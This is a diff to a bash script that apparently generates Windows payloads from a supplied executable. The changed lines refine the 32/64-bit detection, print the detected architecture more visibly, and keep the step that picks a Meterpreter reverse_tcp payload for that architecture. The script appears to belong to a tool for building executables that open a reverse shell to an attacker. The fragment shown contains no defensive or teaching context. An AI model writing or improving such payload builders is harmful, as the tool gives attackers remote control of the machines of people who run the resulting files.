@@ -19,7 +19,13 @@ while true; do
 done
 
 # Detect architecture using file command
-arch=$(file "$input_exe" | grep -q "64-bit" && echo "x64" || echo "x86")
+arch=$(file "$input_exe" | grep -qE "PE32\+|x86-64" && echo "x64" || echo "x86")
+
+# Print detected architecture in a clearer way
+echo ""
+echo "========================================="
+echo "✅ Architecture detected: $arch"
+echo "========================================="
 
 # Select payload based on architecture
 if [ "$arch" == "x64" ]; then
@@ -28,7 +34,6 @@ else
     payload="windows/meterpreter/reverse_tcp"
 fi
 
-echo "[*] Detected architecture: $arch"
 echo "[*] Using payload: $payload"
 
 # Ask for output filename
